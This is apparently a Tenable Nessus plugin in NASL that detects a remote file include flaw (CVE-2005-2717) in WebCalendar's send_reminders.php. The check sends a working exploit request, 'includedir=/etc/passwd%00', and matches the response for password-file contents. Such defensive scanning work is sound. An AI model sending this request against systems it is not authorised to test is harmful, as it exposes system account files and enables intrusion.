#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server has a PHP script that is affected by a remote
file include vulnerability. 

Description :

The remote version of WebCalendar fails to sanitize user-supplied
input to the 'includedir' parameter of the 'send_reminders.php'
script.  By leveraging this flaw, an attacker may be able to view
arbitrary files on the remote host and execute arbitrary PHP code,
possibly taken from third-party hosts. 

See also :

http://sourceforge.net/project/shownotes.php?release_id=350336

Solution : 

Upgrade to WebCalendar 1.0.1 or newer. 

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19502);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2717");
  script_bugtraq_id(14651);
  script_xref(name:"OSVDB", value:"18954");

  script_name(english:"WebCalendar includedir Parameter Remote File Include Vulnerability");
  script_summary(english:"Checks for includedir parameter remote file include vulnerability in WebCalendar");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("webcalendar_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/webcalendar"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Try to exploit the flaw in config.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/tools/send_reminders.php?",
      "includedir=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    #
    # nb: this is unlikely since the app requires magic_quotes_gpc to be
    #     enabled but still...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs would probably still work.
    egrep(string:res, pattern:"Warning.+\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_hole(port);
    exit(0);
  }
  # Checking the version number is the only way to go if PHP's
  # display_errors setting is disabled.
  else if (ver =~ "^(0\.|1\.0\.0)") {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus has determined the vulnerability exists on the remote\n",
      "host simply by looking at the version number of WebCalendar\n",
      "installed there.\n"
    );
    security_hole(port:port, data:report);
    exit(0);
  }
}
